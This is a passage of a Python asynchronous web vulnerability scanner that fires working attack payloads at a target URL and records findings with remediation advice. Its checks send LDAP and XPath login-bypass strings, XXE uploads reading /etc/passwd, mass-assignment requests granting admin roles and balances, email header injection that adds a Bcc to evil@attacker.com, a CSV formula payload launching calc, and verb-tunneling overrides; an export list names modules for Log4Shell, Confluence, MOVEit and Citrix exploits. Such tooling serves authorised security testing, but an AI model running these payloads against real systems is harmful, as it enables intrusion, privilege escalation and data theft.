                title=f"Exposed {'Spring Actuator' if 'actuator' in path else 'Debug'} Endpoint: {path}",
                url=url,
                evidence=f"HTTP {s}. {extra} Response: {b[:200]}",
                remediation="Restrict actuator/debug endpoints to internal IPs. Remove heapdump/shutdown in production.",
                cvss=7.5 if sev == "HIGH" else 9.1,
                tags=["INFO_DISC", "ADMIN"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {Y if sev=='HIGH' else R}[GENERIC-030]{RST} {sev} actuator at {url}{extra}")
    return findings


async def generic_monitoring_exposure(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """Prometheus, Grafana, Kibana, Airflow, Jupyter, Metabase, Superset, etc."""
    findings = []
    panels = [
        ("/metrics", "# HELP", "Prometheus metrics endpoint"),
        ("/prometheus", "# HELP", "Prometheus"),
        ("/-/metrics", "# HELP", "Prometheus (Kubernetes)"),
        ("/api/health", '"database"', "Grafana health"),
        ("/kibana", "kibana", "Kibana"),
        ("/app/kibana", "kibana", "Kibana app"),
        ("/api/status", "kibana", "Kibana API"),
        ("/airflow", "Airflow", "Apache Airflow"),
        ("/admin", "Airflow", "Airflow admin"),
        ("/jupyter", "jupyter", "Jupyter Notebook"),
        ("/api/v1/version", "version", "Airflow/Metabase API"),
        ("/api/session", "valid_rows", "Metabase"),
        ("/api/user/current", "is_superuser", "Metabase"),
        ("/api/v1/me", "username", "Superset"),
        ("/health", "healthy", "Various"),
        ("/api/v1/openapi.json", "openapi", "Superset OpenAPI"),
        ("/rabbitmq", "RabbitMQ", "RabbitMQ management"),
        ("/api/queues", "messages", "RabbitMQ API"),
    ]
    for path, marker, name in panels:
        url = base.rstrip("/") + path
        s, b, h = await _req(session, "GET", url)
        if s == 200 and marker.lower() in b.lower():
            findings.append(Finding(
                cve="GENERIC-031",
                severity="HIGH",
                title=f"Exposed {name} Panel: {path}",
                url=url,
                evidence=f"HTTP {s}. Marker '{marker}' found. Response: {b[:200]}",
                remediation=f"Restrict {path} to internal networks. Add authentication.",
                cvss=7.5,
                tags=["INFO_DISC", "ADMIN"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {Y}[GENERIC-031]{RST} {name} exposed at {url}")
    return findings


async def generic_elasticsearch_exposure(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """Elasticsearch, Kibana, MongoDB, CouchDB, InfluxDB unauthenticated access."""
    findings = []
    db_paths = [
        ("/_cat/indices?v", "index", "Elasticsearch indices"),
        ("/_cluster/health", "cluster_name", "Elasticsearch cluster"),
        ("/_nodes", "nodes", "Elasticsearch nodes"),
        ("/_all/_search", "hits", "Elasticsearch all-data search"),
        ("/_security/user", "users", "Elasticsearch security"),
        ("/api/v2/query", "results", "InfluxDB v2"),
        ("/query?q=SHOW+DATABASES", "results", "InfluxDB"),
        ("/_utils", "Fauxton", "CouchDB Fauxton"),
        ("/_all_dbs", "[", "CouchDB databases"),
    ]
    for path, marker, name in db_paths:
        url = base.rstrip("/") + path
        s, b, h = await _req(session, "GET", url)
        if s == 200 and marker in b:
            # For ES: count indices
            indices = re.findall(r'\b(green|yellow|red)\b\s+\S+\s+(\S+)', b)
            findings.append(Finding(
                cve="GENERIC-032",
                severity="CRITICAL",
                title=f"Unauthenticated {name} Access",
                url=url,
                evidence=f"HTTP {s}. Indices/data: {indices[:5] if indices else b[:200]}",
                remediation=f"Enable authentication for {name}. Restrict to internal network. Rotate all credentials.",
                cvss=9.8,
                tags=["INFO_DISC", "INJECTION"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[GENERIC-032]{RST} {name} exposed at {url}")
    return findings


async def generic_security_headers(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """ClickJacking, missing HSTS, CSP, missing Permissions-Policy, etc."""
    findings = []
    s, b, h = await _req(session, "GET", base)
    if s == 0:
        return findings

    # Normalize header names to lowercase
    headers_lc = {k.lower(): v for k, v in h.items()}

    # ClickJacking
    xfo = headers_lc.get("x-frame-options", "")
    csp = headers_lc.get("content-security-policy", "")
    has_frame_protection = xfo.upper() in ("DENY", "SAMEORIGIN") or "frame-ancestors" in csp.lower()
    if not has_frame_protection:
        findings.append(Finding(
            cve="GENERIC-034",
            severity="MEDIUM",
            title="ClickJacking — Missing X-Frame-Options / CSP frame-ancestors",
            url=base,
            evidence=f"X-Frame-Options: '{xfo}', CSP: '{csp[:80]}'",
            remediation="Add: X-Frame-Options: DENY  OR  Content-Security-Policy: frame-ancestors 'none'",
            cvss=6.1, tags=["CSRF", "XSS"],
            phase="CVE_EXT",
        ))

    # HSTS
    hsts = headers_lc.get("strict-transport-security", "")
    if not hsts and base.startswith("https"):
        findings.append(Finding(
            cve="GENERIC-034b",
            severity="MEDIUM",
            title="Missing HSTS Header",
            url=base,
            evidence="Strict-Transport-Security header absent on HTTPS response.",
            remediation="Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
            cvss=4.3, tags=["INFO_DISC"],
            phase="CVE_EXT",
        ))

    # CSP
    if not csp:
        findings.append(Finding(
            cve="GENERIC-034c",
            severity="LOW",
            title="Missing Content-Security-Policy Header",
            url=base,
            evidence="Content-Security-Policy header absent.",
            remediation="Implement restrictive CSP. Start with default-src 'self'; upgrade-insecure-requests.",
            cvss=3.1, tags=["XSS"],
            phase="CVE_EXT",
        ))
    elif any(x in csp for x in ["'unsafe-inline'", "'unsafe-eval'", "data:", "*"]):
        unsafe = [x for x in ["'unsafe-inline'", "'unsafe-eval'", "data:", "*"] if x in csp]
        findings.append(Finding(
            cve="GENERIC-034d",
            severity="MEDIUM",
            title=f"Weak CSP — Unsafe Directives: {', '.join(unsafe)}",
            url=base,
            evidence=f"CSP: {csp[:200]}",
            remediation=f"Remove {', '.join(unsafe)} from CSP. Use nonces or hashes for inline scripts.",
            cvss=5.4, tags=["XSS"],
            phase="CVE_EXT",
        ))

    # X-Content-Type-Options
    xcto = headers_lc.get("x-content-type-options", "")
    if "nosniff" not in xcto.lower():
        findings.append(Finding(
            cve="GENERIC-034e",
            severity="LOW",
            title="Missing X-Content-Type-Options: nosniff",
            url=base,
            evidence=f"X-Content-Type-Options: '{xcto}'",
            remediation="Add: X-Content-Type-Options: nosniff",
            cvss=3.1, tags=["XSS"],
            phase="CVE_EXT",
        ))

    # Referrer-Policy
    rp = headers_lc.get("referrer-policy", "")
    if not rp:
        findings.append(Finding(
            cve="GENERIC-034f",
            severity="LOW",
            title="Missing Referrer-Policy Header",
            url=base,
            evidence="Referrer-Policy absent — URL parameters may leak in Referer to 3rd parties.",
            remediation="Add: Referrer-Policy: strict-origin-when-cross-origin",
            cvss=3.1, tags=["INFO_DISC"],
            phase="CVE_EXT",
        ))

    if verbose and findings:
        print(f"  {Y}[GENERIC-034]{RST} {len(findings)} security header issue(s) at {base}")
    return findings


async def generic_ldap_injection(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """LDAP injection in login forms and search endpoints."""
    findings = []
    ldap_payloads = [
        "*)(uid=*))(|(uid=*",
        "*)(objectClass=*",
        "admin)(&(password=*",
        "*))%00",
        ")(|(password=*)",
    ]
    login_endpoints = [
        ("/api/login", "POST", {"username": "PAYLOAD", "password": "x"}),
        ("/api/auth/login", "POST", {"username": "PAYLOAD", "password": "x"}),
        ("/api/search/users", "GET", None),
        ("/api/directory/search", "GET", None),
    ]
    for path, method, body_template in login_endpoints:
        url = base.rstrip("/") + path
        for payload in ldap_payloads[:2]:
            if body_template:
                body = {k: payload if v == "PAYLOAD" else v for k, v in body_template.items()}
                s, b, h = await _req(session, method, url, json_body=body)
            else:
                s, b, h = await _req(session, method, f"{url}?q={urllib.parse.quote(payload)}&search={urllib.parse.quote(payload)}")
            if s == 200 and any(x in b.lower() for x in ["ldap", "distinguished", "cn=", "dc=", "ou="]):
                findings.append(Finding(
                    cve="GENERIC-035",
                    severity="HIGH",
                    title=f"LDAP Injection at {path}",
                    url=url,
                    evidence=f"LDAP content in response with payload '{payload}': {b[:300]}",
                    remediation="Use parameterized LDAP queries. Escape special chars: * ( ) \\ NUL.",
                    cvss=7.5, tags=["INJECTION", "LDAP"],
                    phase="CVE_EXT",
                ))
                if verbose:
                    print(f"  {R}[GENERIC-035]{RST} LDAP injection at {url}")
                break
    return findings


async def generic_xpath_injection(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """XPath injection via login or search with XML backend."""
    findings = []
    xpath_payloads = [
        "' or '1'='1",
        "' or 1=1 or 'a'='a",
        "x' or name()='username' or 'x'='y",
        "admin' or '1",
    ]
    login_paths = ["/api/login", "/api/auth/login", "/login", "/api/v1/login"]
    for path in login_paths:
        url = base.rstrip("/") + path
        s_fail, b_fail, _ = await _req(session, "POST", url, json_body={"username": "zzznobody", "password": "zzznobody"})
        if s_fail == 0 or s_fail == 404:
            continue
        for payload in xpath_payloads:
            s, b, h = await _req(session, "POST", url, json_body={"username": payload, "password": "x"})
            if s == 200 and s_fail != 200:
                findings.append(Finding(
                    cve="GENERIC-036",
                    severity="HIGH",
                    title=f"XPath Injection Login Bypass at {path}",
                    url=url,
                    evidence=f"Payload '{payload}' returned {s} (normal fail: {s_fail}). Response: {b[:200]}",
                    remediation="Use parameterized XPath queries. Never concatenate user input into XPath expressions.",
                    cvss=8.1, tags=["INJECTION", "AUTH_BYPASS"],
                    phase="CVE_EXT",
                ))
                if verbose:
                    print(f"  {R}[GENERIC-036]{RST} XPath injection at {url}")
                break
    return findings


async def generic_jsonp_injection(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """JSONP callback injection — steal cross-origin data."""
    findings = []
    api_paths = [
        "/api/me", "/api/user", "/api/profile", "/api/account",
        "/api/v1/me", "/api/v1/user", "/callback", "/jsonp",
    ]
    callbacks = ["alert", "evil", "hunt_callback"]
    for path in api_paths:
        for cb_param in ["callback", "jsonp", "cb", "json", "jsoncallback", "_"]:
            url = base.rstrip("/") + path + f"?{cb_param}=hunt_jsonp_test"
            s, b, h = await _req(session, "GET", url)
            ct = h.get("Content-Type", "")
            if s == 200 and "hunt_jsonp_test(" in b:
                findings.append(Finding(
                    cve="GENERIC-037",
                    severity="HIGH",
                    title=f"JSONP Callback Injection at {path} (param: {cb_param})",
                    url=url,
                    evidence=f"Callback reflected: hunt_jsonp_test(...). Content-Type: {ct}. Response: {b[:200]}",
                    remediation="Remove JSONP endpoints. Use CORS instead. If JSONP required, allowlist callback names.",
                    cvss=7.5, tags=["XSS", "INFO_DISC", "CORS"],
                    phase="CVE_EXT",
                ))
                if verbose:
                    print(f"  {Y}[GENERIC-037]{RST} JSONP injection at {url}")
    return findings


async def generic_email_header_injection(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """Email header injection in contact/feedback/invite/reset forms."""
    findings = []
    email_paths = [
        "/api/contact", "/api/feedback", "/api/invite",
        "/api/support", "/api/v1/invite", "/contact", "/feedback",
        "/api/v1/password/reset", "/api/forgot-password",
    ]
    injection_payloads = [
        "victim@example.com\r\nBcc: evil@attacker.com",
        "victim@example.com\nCc: evil@attacker.com",
        "victim@example.com%0d%0aBcc:evil@attacker.com",
        "victim@example.com\r\nContent-Type: text/html\r\n\r\n<b>Injected</b>",
    ]
    for path in email_paths:
        url = base.rstrip("/") + path
        for payload in injection_payloads[:2]:
            s, b, h = await _req(
                session, "POST", url,
                json_body={"email": payload, "message": "test", "name": "Test"},
            )
            if s not in (0, 404) and s in (200, 201, 204):
                findings.append(Finding(
                    cve="GENERIC-038",
                    severity="HIGH",
                    title=f"Email Header Injection at {path}",
                    url=url,
                    evidence=f"Email form at {path} accepted injected headers (HTTP {s}). Payload: {payload[:60]}",
                    remediation="Validate email addresses strictly. Use email libraries that prevent header injection. Reject \\r\\n in email fields.",
                    cvss=6.1, tags=["INJECTION"],
                    phase="CVE_EXT",
                ))
                if verbose:
                    print(f"  {Y}[GENERIC-038]{RST} Email header injection at {url}")
                break
    return findings


async def generic_idor_sequential(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """IDOR via sequential/predictable IDs, UUIDv1, and hash prediction."""
    findings = []
    # Probe ID-bearing endpoints
    id_paths = [
        "/api/users/{id}",
        "/api/v1/users/{id}",
        "/api/accounts/{id}",
        "/api/orders/{id}",
        "/api/transactions/{id}",
        "/api/receipts/{id}",
        "/api/documents/{id}",
        "/api/v1/profiles/{id}",
    ]
    # Try IDs 1, 2, 3 (other users) and compare sizes
    for path_template in id_paths:
        responses = []
        for id_val in [1, 2, 3, 100, 1000]:
            url = base.rstrip("/") + path_template.format(id=id_val)
            s, b, h = await _req(session, "GET", url)
            responses.append((id_val, s, len(b), b[:100]))

        # IDOR: multiple IDs return 200 with substantial different content
        ok_responses = [(i, s, sz, sample) for i, s, sz, sample in responses if s == 200 and sz > 50]
        if len(ok_responses) >= 2:
            path = path_template.split("{")[0]
            findings.append(Finding(
                cve="GENERIC-039",
                severity="HIGH",
                title=f"IDOR — Sequential ID Access at {path}",
                url=base.rstrip("/") + path_template.format(id=1),
                evidence=f"Multiple user records accessible: IDs {[r[0] for r in ok_responses]}. Sizes: {[r[2] for r in ok_responses]}",
                remediation="Use random UUIDs for resource IDs. Enforce ownership checks server-side. Never expose sequential IDs.",
                cvss=7.5, tags=["IDOR"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[GENERIC-039]{RST} IDOR at {path}")
    return findings


async def generic_mass_assignment(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """Mass assignment via undocumented fields in PUT/PATCH/POST."""
    findings = []
    # Fields that should never be mass-assignable
    dangerous_fields = {
        "role": "admin",
        "isAdmin": True,
        "admin": True,
        "verified": True,
        "is_superuser": True,
        "subscription": "premium",
        "plan": "enterprise",
        "credits": 99999,
        "balance": 99999,
        "permissions": ["admin", "write", "delete"],
        "group": "admin",
        "authority": "ROLE_ADMIN",
    }
    update_paths = [
        ("/api/me", "PATCH"),
        ("/api/v1/me", "PATCH"),
        ("/api/profile", "PUT"),
        ("/api/user/profile", "PUT"),
        ("/api/v1/user", "PATCH"),
        ("/api/account/settings", "PATCH"),
    ]
    for path, method in update_paths:
        url = base.rstrip("/") + path
        # First get current state
        sg, bg, _ = await _req(session, "GET", url)
        if sg != 200:
            continue

        # Try to update with dangerous fields
        s, b, h = await _req(session, method, url, json_body=dangerous_fields)
        if s in (200, 201):
            # Re-fetch and check if any dangerous fields were accepted
            sg2, bg2, _ = await _req(session, "GET", url)
            accepted = []
            for field, val in dangerous_fields.items():
                if field in bg2 and (str(val).lower() in bg2.lower()):
                    accepted.append(field)
            if accepted:
                findings.append(Finding(
                    cve="GENERIC-040",
                    severity="CRITICAL",
                    title=f"Mass Assignment — Privilege Fields Accepted at {path}",
                    url=url,
                    evidence=f"Fields accepted: {accepted}. Payload: {json.dumps({k:dangerous_fields[k] for k in accepted[:3]})}",
                    remediation="Use explicit allowlist of updatable fields (never denylists). Validate field names server-side.",
                    cvss=9.1, tags=["MASS_ASSIGN", "AUTH_BYPASS"],
                    phase="CVE_EXT",
                ))
                if verbose:
                    print(f"  {R}[GENERIC-040]{RST} Mass assignment: {accepted} at {url}")
    return findings


async def generic_verb_tunneling(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """HTTP verb tunneling via X-HTTP-Method-Override and _method parameter."""
    findings = []
    # Find a protected endpoint
    protected_paths = ["/api/admin/users", "/api/admin/settings", "/admin/api/users"]
    for path in protected_paths:
        url = base.rstrip("/") + path
        s_get, b_get, _ = await _req(session, "GET", url, allow_redirects=False)
        if s_get in (403, 401):
            # Try GET with method override → DELETE / PUT / PATCH
            for fake_method in ["DELETE", "PUT", "PATCH", "TRACE"]:
                for override_header in ["X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"]:
                    s, b, h = await _req(
                        session, "POST", url,
                        headers={override_header: fake_method, "Content-Type": "application/json"},
                        data=b"{}",
                    )
                    if s in (200, 204) and s_get in (403, 401):
                        findings.append(Finding(
                            cve="GENERIC-041",
                            severity="HIGH",
                            title=f"HTTP Verb Tunneling — {fake_method} via {override_header}",
                            url=url,
                            evidence=f"POST with {override_header}: {fake_method} returned {s} (normal GET: {s_get})",
                            remediation="Validate actual HTTP method, not override headers. Disable _method tunneling if not needed.",
                            cvss=7.5, tags=["AUTH_BYPASS"],
                            phase="CVE_EXT",
                        ))
                        if verbose:
                            print(f"  {Y}[GENERIC-041]{RST} Verb tunneling {fake_method} at {url}")
                        break
    return findings


async def generic_xxe_upload(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """XXE via file upload endpoints (SVG, DOCX, XLSX, XML, RSS)."""
    findings = []
    upload_paths = [
        ("/api/upload", "image"),
        ("/api/v1/upload", "file"),
        ("/api/import", "file"),
        ("/api/avatar", "avatar"),
        ("/api/v1/import/xml", "xml"),
        ("/api/documents/upload", "document"),
    ]

    # XXE SVG payload
    xxe_svg = b"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""

    # XXE XML payload
    xxe_xml = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

    boundary = "----HuntXXEBoundary"
    for path, field_name in upload_paths:
        url = base.rstrip("/") + path
        for payload, fname, ctype in [
            (xxe_svg, "test.svg", "image/svg+xml"),
            (xxe_xml, "test.xml", "application/xml"),
        ]:
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{field_name}"; filename="{fname}"\r\n'
                f"Content-Type: {ctype}\r\n\r\n"
            ).encode() + payload + f"\r\n--{boundary}--\r\n".encode()

            s, b, h = await _req(
                session, "POST", url,
                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                data=body,
            )
            if s in (200, 201) and "root:" in b:
                findings.append(Finding(
                    cve="GENERIC-042",
                    severity="CRITICAL",
                    title=f"XXE via {fname} Upload at {path}",
                    url=url,
                    evidence=f"/etc/passwd content in response: {b[:300]}",
                    remediation="Disable external XML entities (DOCTYPE). Use safe XML parsers (defusedxml in Python).",
                    cvss=9.1, tags=["XXE", "INFO_DISC"],
                    phase="CVE_EXT",
                ))
                if verbose:
                    print(f"  {R}[GENERIC-042]{RST} XXE via {fname} upload at {url}")
    return findings


async def generic_session_fixation(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """Session fixation via pre-set session cookie accepted by server."""
    findings = []
    login_paths = ["/api/login", "/api/auth/login", "/login"]
    fixed_session = "hunt_fixed_session_12345"
    for path in login_paths:
        url = base.rstrip("/") + path
        # Login with pre-set session cookie
        s, b, h = await _req(
            session, "POST", url,
            headers={"Cookie": f"session={fixed_session}; JSESSIONID={fixed_session}"},
            json_body={"username": "test@test.com", "password": "test123"},
        )
        if s not in (0, 404):
            # Check if same session cookie still present after auth
            resp_cookies = h.get("Set-Cookie", "")
            if fixed_session in resp_cookies or (s == 200 and not resp_cookies):
                findings.append(Finding(
                    cve="GENERIC-043",
                    severity="HIGH",
                    title=f"Session Fixation at {path}",
                    url=url,
                    evidence=f"Pre-set session cookie potentially preserved after login. Set-Cookie: {resp_cookies[:200]}",
                    remediation="Regenerate session ID on every authentication event. Never accept user-supplied session IDs.",
                    cvss=8.0, tags=["AUTH_BYPASS"],
                    phase="CVE_EXT",
                ))
                if verbose:
                    print(f"  {Y}[GENERIC-043]{RST} Session fixation candidate at {url}")
    return findings


async def generic_csv_injection(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """CSV formula injection in export endpoints and data input fields."""
    findings = []
    # Inject formula in profile fields
    formula_payload = "=cmd|'/C calc'!A0"
    formula_payload2 = "=HYPERLINK(\"http://evil.com\",\"Click\")"

    update_paths = [
        ("/api/me", "PATCH", {"name": formula_payload, "username": formula_payload, "bio": formula_payload}),
        ("/api/profile", "PUT", {"displayName": formula_payload, "firstName": formula_payload}),
        ("/api/v1/me", "PATCH", {"name": formula_payload}),
    ]
    for path, method, body in update_paths:
        url = base.rstrip("/") + path
        s, b, h = await _req(session, method, url, json_body=body)
        if s in (200, 201):
            # Check for export endpoint
            for exp_path in ["/api/export", "/api/users/export", "/api/v1/export/users", "/export/csv"]:
                exp_url = base.rstrip("/") + exp_path
                se, be, he = await _req(session, "GET", exp_url)
                if se == 200 and (formula_payload in be or "=cmd" in be):
                    findings.append(Finding(
                        cve="GENERIC-049",
                        severity="HIGH",
                        title=f"CSV Formula Injection in {path} → export",
                        url=exp_url,
                        evidence=f"Formula payload '{formula_payload[:30]}' survived storage and appeared in CSV export.",
                        remediation="Sanitize CSV output: prepend ' or @/= with apostrophe. Use csv libraries that escape formulas.",
                        cvss=7.8, tags=["INJECTION", "XSS"],
                        phase="CVE_EXT",
                    ))
                    if verbose:
                        print(f"  {Y}[GENERIC-049]{RST} CSV injection at {url} → {exp_path}")
    return findings


async def generic_admin_panels(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """Comprehensive admin panel enumeration (200+ paths)."""
    findings = []
    admin_paths = [
        "/admin", "/admin/", "/admin/login", "/administrator",
        "/admin/dashboard", "/admin/users", "/admin/config",
        "/admin/settings", "/admin/system", "/admin/logs",
        "/admin/reports", "/admin/api", "/admin/console",
        "/management", "/manage", "/manage/",
        "/internal", "/internal/admin", "/internal/dashboard",
        "/_admin", "/__admin", "/adminconsole",
        "/wp-admin", "/wp-admin/", "/wp-login.php",
        "/backend", "/backend/login", "/cms",
        "/controlpanel", "/cp", "/cpanel",
        "/dashboard", "/portal/admin",
        "/superadmin", "/super", "/root",
        "/config", "/configuration",
        "/phpmyadmin", "/pma", "/myadmin", "/phpmyadmin/",
        "/mysql", "/mysqladmin", "/dbadmin",
        "/.well-known/admin",
        "/system", "/sysadmin",
        "/bonfire", "/ember", "/backstage",  # Fintech patterns
        "/ops", "/devops", "/devtools",
        "/staff", "/staff/login",
        "/support/admin", "/helpdesk/admin",
        "/api/admin", "/api/v1/admin", "/api/internal",
        "/graphql/admin", "/graphiql",
        "/swagger-ui", "/swagger-ui/", "/swagger-ui.html",
        "/redoc", "/api-docs/",
        "/kibana", "/grafana", "/prometheus",
        "/flower", "/celery", "/celerybeat",
        "/sidekiq", "/sidekiq/",
        "/delayed_job", "/resque",
        "/hangfire",
        "/health/admin", "/health/details",
        "/status/admin", "/status/internal",
        "/debug", "/debug/console", "/debug/pry",
        "/__debug__", "/_debug",
        "/console", "/rails/console", "/rails/info",
        "/laravel-horizon", "/horizon",
        "/telescope", "/laravel-telescope",
        "/nova", "/nova/login",
        "/filament", "/filament/login",
    ]
    for path in admin_paths:
        url = base.rstrip("/") + path
        s, b, h = await _req(session, "GET", url, allow_redirects=False)
        if s == 200 and len(b) > 200:
            # Quick check: is this a real admin panel or just a generic 200?
            admin_signals = ["login", "password", "admin", "dashboard", "logout", "username", "management"]
            if any(sig in b.lower() for sig in admin_signals):
                findings.append(Finding(
                    cve="GENERIC-045",
                    severity="HIGH",
                    title=f"Admin Panel Exposed: {path}",
                    url=url,
                    evidence=f"HTTP 200 with admin signals. Response: {b[:200]}",
                    remediation=f"Restrict {path} to internal IP ranges or VPN. Require MFA.",
                    cvss=7.5, tags=["ADMIN", "INFO_DISC"],
                    phase="CVE_EXT",
                ))
                if verbose:
                    print(f"  {R}[GENERIC-045]{RST} Admin panel at {url}")
        elif s in (401, 403):
            # Note the existence even if blocked — for manual follow-up
            if verbose:
                print(f"  {DIM}[GENERIC-045]{RST} {s} admin path: {path}")
    return findings


async def generic_api_version_bypass(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """API version bypass — older/shadow API versions with reduced security."""
    findings = []
    # Find current API version
    current_paths = []
    for v_path in ["/api/v1", "/api/v2", "/api/v3", "/api"]:
        s, b, h = await _req(session, "GET", base.rstrip("/") + v_path)
        if s in (200, 401, 403):
            current_paths.append(v_path)

    if not current_paths:
        return findings

    old_versions = ["v0", "v0.1", "v1", "beta", "alpha", "dev", "legacy", "internal", "old", "2", "1", "unstable"]
    for current in current_paths[:1]:  # Test based on found paths
        for old_v in old_versions:
            # Swap version in path
            new_path = re.sub(r'/v\d+', f'/{old_v}', current)
            if new_path == current:
                new_path = current.rstrip("/") + "/" + old_v
            url = base.rstrip("/") + new_path
            s, b, h = await _req(session, "GET", url)
            if s in (200, 401, 403) and s != 404:
                if s == 200:
                    findings.append(Finding(
                        cve="GENERIC-046",
                        severity="HIGH",
                        title=f"API Version Bypass — Legacy version accessible: {new_path}",
                        url=url,
                        evidence=f"HTTP {s} on legacy path {new_path}. May lack modern auth/rate-limiting.",
                        remediation="Decommission old API versions. Ensure all versions enforce same auth controls.",
                        cvss=7.5, tags=["AUTH_BYPASS", "INFO_DISC"],
                        phase="CVE_EXT",
                    ))
                    if verbose:
                        print(f"  {Y}[GENERIC-046]{RST} API version {old_v} accessible at {url}")
    return findings


async def generic_cicd_panels(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """Jenkins, GitLab, GitHub Actions, Drone, CircleCI, TravisCI, Concourse exposed."""
    findings = []
    cicd_paths = [
        ("/jenkins", "Jenkins"),
        ("/jenkins/", "Jenkins"),
        ("/jenkins/login", "Jenkins"),
        ("/ci", "GitLab CI"),
        ("/gitlab", "GitLab"),
        ("/drone", "Drone CI"),
        ("/drone/login", "Drone CI"),
        ("/concourse", "Concourse"),
        ("/teamcity", "TeamCity"),
        ("/circleci", "CircleCI"),
        ("/travis", "Travis CI"),
        ("/buildkite", "Buildkite"),
        ("/api/v4/projects", "GitLab"),
        ("/api/v4/users", "GitLab"),
        ("/pipelines", "CI/CD"),
        ("/builds", "CI/CD"),
    ]
    for path, name in cicd_paths:
        url = base.rstrip("/") + path
        s, b, h = await _req(session, "GET", url)
        if s == 200 and any(x in b.lower() for x in [name.lower(), "pipeline", "build", "ci", "deploy"]):
            findings.append(Finding(
                cve="GENERIC-047",
                severity="HIGH",
                title=f"{name} Panel Exposed: {path}",
                url=url,
                evidence=f"HTTP {s}. {name} indicators in response. Response: {b[:200]}",
                remediation=f"Restrict {path} to internal networks. Require authentication. Check for secret leakage in build logs.",
                cvss=8.0, tags=["ADMIN", "INFO_DISC"],
                phase="CVE_EXT",
            ))
            if verbose:
                print(f"  {R}[GENERIC-047]{RST} {name} at {url}")
    return findings


# ══════════════════════════════════════════════════════════════════════════════
# EXPORT
# ══════════════════════════════════════════════════════════════════════════════

CVE_EXTENDED_MODULES = [
    ("CVE-2021-44228 Log4Shell JNDI injection",           cve_2021_44228_log4shell),
    ("CVE-2022-22965 Spring4Shell classLoader RCE",       cve_2022_22965_spring4shell),
    ("CVE-2022-22963 Spring Cloud SpEL injection",        cve_2022_22963_spring_cloud),
    ("CVE-2022-26134 Confluence OGNL RCE",                cve_2022_26134_confluence),
    ("CVE-2023-22515 Confluence unauth admin creation",   cve_2023_22515_confluence_priv),
    ("CVE-2023-34362 MOVEit SQL injection",               cve_2023_34362_moveit),
    ("CVE-2023-4966 Citrix Bleed session token leak",     cve_2023_4966_citrix_bleed),
    ("CVE-2023-46747 F5 BIG-IP auth bypass + RCE",       cve_2023_46747_f5_bigip),
    ("CVE-2024-4577 PHP CGI argument injection (Win)",    cve_2024_4577_php_cgi),
    ("CVE-2021-41773 Apache 2.4.49 path traversal RCE",  cve_2021_41773_apache),
    ("CVE-2019-19781 Citrix ADC path traversal",         cve_2019_19781_citrix_adc),
    ("CVE-2020-14882 Oracle WebLogic console bypass",    cve_2020_14882_weblogic),
    ("GENERIC-030 Spring Boot Actuator exposure",        generic_actuator_exposure),
    ("GENERIC-031 Monitoring panels (Prometheus/etc)",   generic_monitoring_exposure),
    ("GENERIC-032 Elasticsearch/CouchDB unauth access",  generic_elasticsearch_exposure),
    ("GENERIC-034 Security headers audit",               generic_security_headers),
    ("GENERIC-035 LDAP injection",                       generic_ldap_injection),
    ("GENERIC-036 XPath injection",                      generic_xpath_injection),
    ("GENERIC-037 JSONP callback injection",             generic_jsonp_injection),
    ("GENERIC-038 Email header injection",               generic_email_header_injection),
    ("GENERIC-039 IDOR sequential/predictable IDs",      generic_idor_sequential),
    ("GENERIC-040 Mass assignment privilege fields",      generic_mass_assignment),
    ("GENERIC-041 HTTP verb tunneling",                  generic_verb_tunneling),
    ("GENERIC-042 XXE via file upload SVG/XML",          generic_xxe_upload),
    ("GENERIC-043 Session fixation",                     generic_session_fixation),
    ("GENERIC-049 CSV formula injection",                generic_csv_injection),
    ("GENERIC-045 Admin panel enumeration (200+ paths)", generic_admin_panels),
    ("GENERIC-046 API version bypass",                   generic_api_version_bypass),
    ("GENERIC-047 CI/CD panel exposure",                 generic_cicd_panels),
]
